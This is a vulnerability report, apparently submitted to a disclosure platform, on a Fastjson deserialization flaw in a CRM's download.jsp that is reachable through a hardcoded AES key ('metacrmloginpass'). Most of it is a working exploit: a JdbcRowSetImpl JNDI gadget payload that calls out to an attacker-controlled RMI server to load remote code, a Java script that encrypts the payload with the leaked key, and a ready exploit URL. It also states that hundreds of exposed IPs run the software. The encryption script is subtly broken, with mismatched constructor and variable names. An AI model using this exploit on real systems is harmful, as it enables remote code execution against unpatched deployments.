### <font style="color:rgb(28, 31, 35);">The download.jsp has a front-end Fastjson deserialization vulnerability.</font>
<font style="color:rgb(28, 31, 35);">The number of IPs using this software and their fingerprints are as follows:</font>

**<font style="color:rgb(28, 31, 35);">1,342 matching results, with 735 unique IPs.</font>**

![](https://cdn.nlark.com/yuque/0/2025/png/50620181/1751782333856-f16a2cbf-071d-4f15-9b3a-39d858a04271.png?x-oss-process=image%2Fformat%2Cwebp)

<font style="color:rgb(28, 31, 35);">One sink point is located in `com.metasoft.framework.pub.download.AnalyzeParam`.</font>

![](https://cdn.nlark.com/yuque/0/2025/png/50620181/1751860281856-54bf9502-8ed6-46e3-ab75-83aa426e89c8.png)

<font style="color:rgba(0, 0, 0, 0.85);">The AEC (Advanced Encryption Standard) class handles encryption, decryption, and hashing operations on encrypted data. However, the encryption code employs a hardcoded secret key, which introduces a critical vulnerability:</font>

```bash
package com.metasoft.framework.pub.malg.aes;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import sun.misc.BASE64Decoder;
import sun.misc.BASE64Encoder;

public class AesEcbCipher {
    private static final String SECRET_KEY = "metacrmloginpass";
    private byte[] key = "metacrmloginpass".getBytes();

    public AesEcbCipher(String secretKey) {
        this.key = secretKey.getBytes();
    }

    public AesEcbCipher() {
    }

    public String Encrypt(String sSrc) {
        try {
            SecretKeySpec skeySpec = new SecretKeySpec(this.key, "AES");
            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
            cipher.init(1, skeySpec);
            byte[] encrypted = cipher.doFinal(sSrc.getBytes("UTF-8"));
            return (new BASE64Encoder()).encode(encrypted);
        } catch (Exception var5) {
            Exception ex = var5;
            ex.printStackTrace();
            return null;
        }
    }

    public String Decrypt(String sSrc) {
        if (sSrc != null && sSrc.length() != 0) {
            try {
                SecretKeySpec skeySpec = new SecretKeySpec(this.key, "AES");
                Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
                cipher.init(2, skeySpec);
                byte[] encrypted1 = (new BASE64Decoder()).decodeBuffer(sSrc);
                byte[] original = cipher.doFinal(encrypted1);
                String originalString = new String(original, "UTF-8");
                return originalString;
            } catch (Exception var7) {
                return sSrc;
            }
        } else {
            return sSrc;
        }
    }

    public String encrypt(String sSrc) {
        try {
            SecretKeySpec skeySpec = new SecretKeySpec(this.key, "AES");
            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
            cipher.init(1, skeySpec);
            byte[] encrypted = cipher.doFinal(sSrc.getBytes("UTF-8"));
            return Hex.encodeHexStr(encrypted);
        } catch (Exception var5) {
            Exception ex = var5;
            ex.printStackTrace();
            return null;
        }
    }

    public String decrypt(String sSrc) {
        if (sSrc != null && sSrc.length() != 0) {
            try {
                SecretKeySpec skeySpec = new SecretKeySpec(this.key, "AES");
                Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
                cipher.init(2, skeySpec);
                byte[] encrypted1 = Hex.decodeHex(sSrc.toCharArray());
                byte[] original = cipher.doFinal(encrypted1);
                String originalString = new String(original, "UTF-8");
                return originalString;
            } catch (Exception var7) {
                return sSrc;
            }
        } else {
            return sSrc;
        }
    }
}

```

<font style="color:rgb(28, 31, 35);">Tracing further up to see where AnalyzeParam is called, we arrive at /business/common/download.jsp.</font>

![](https://cdn.nlark.com/yuque/0/2025/png/50620181/1751860486967-54c61726-50b2-4699-bd1a-296267c0b833.png)

<font style="color:rgb(28, 31, 35);">Here, data is passed in via the parameter `p` and assigned to `downUrl`, after which `AnalyzeParam` is called to perform related operations on `downUrl`. This makes the call chain clear as follows:</font>

/business/common/download.jsp -> com.metasoft.framework.pub.download.AnalyzeParam -> com/metasoft/framework/pub/malg/aes/AesEcbCipher

**Exploitation POC:**  
<font style="color:rgba(0, 0, 0, 0.85);">Leverage a generic Fastjson gadget chain:</font>

```bash
{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://你的RMI服务器/Object","autoCommit":true}}""}
```

这<font style="color:rgb(28, 31, 35);">The RMI service here is implemented using the tool available at </font>**<font style="color:rgb(28, 31, 35);">https://github.com/wyzxxz/jndi_tool</font>**<font style="color:rgb(28, 31, 35);">, which works really well! The constructed encryption script is as follows:</font>

```bash
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import org.apache.commons.codec.binary.Hex;

public class HelloAES {
    private static final String SECRET_KEY = "metacrmloginpass";
    private byte[] key = SECRET_KEY.getBytes();


    public FuckAES(String secretKey) {
        this.key = secretKey.getBytes();
    }

    public FuckAES() {
    }

    public String encrypt(String sSrc) {
        try {
            SecretKeySpec skeySpec = new SecretKeySpec(this.key, "AES");
            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
            cipher.init(Cipher.ENCRYPT_MODE, skeySpec);
            byte[] encrypted = cipher.doFinal(sSrc.getBytes("UTF-8"));
            return Hex.encodeHexString(encrypted);
        } catch (Exception ex) {
            ex.printStackTrace();
            return null;
        }
    }

    public String decrypt(String sSrc) {
        if (sSrc != null && !sSrc.isEmpty()) {
            try {
                SecretKeySpec skeySpec = new SecretKeySpec(this.key, "AES");
                Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
                cipher.init(Cipher.DECRYPT_MODE, skeySpec);
                byte[] encrypted1 = Hex.decodeHex(sSrc.toCharArray());
                byte[] original = cipher.doFinal(encrypted1);
                return new String(original, "UTF-8");
            } catch (Exception ex) {
                return sSrc;
            }
        } else {
            return sSrc;
        }
    }

    public static void main(String[] args) {

        String HelloPayload = "{\"@type\":\"com.alibaba.fastjson.JSONObject\",{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://你的RMI服务\",\"autoCommit\":true}}\"\"}";

        String Helloppp = new HelloAES().encrypt(fuckPayload);

        System.out.println(Helloppp);

        System.out.println(new HelloAES().decrypt(Helloppp));

    }
}
```

![](https://cdn.nlark.com/yuque/0/2025/png/50620181/1751861026213-8a9726b6-3cc7-48b8-a24a-a7fac90bf99b.png)

**Exploitation POC:**

`http://ip/business/common/download.jsp?p=yourpayload`。

![](https://cdn.nlark.com/yuque/0/2025/png/50620181/1751861116964-2b88ec3e-3669-4f6a-8726-06534eb5ce44.png)

<font style="color:rgba(0, 0, 0, 0.85);">RMI callback display:</font>

![](https://cdn.nlark.com/yuque/0/2025/png/50620181/1751861084445-a615b980-3ead-49fa-ba80-728d76ec8109.png)

This proves that the vulnerability exists.

Wish you a pleasant life, and thank you for your review!

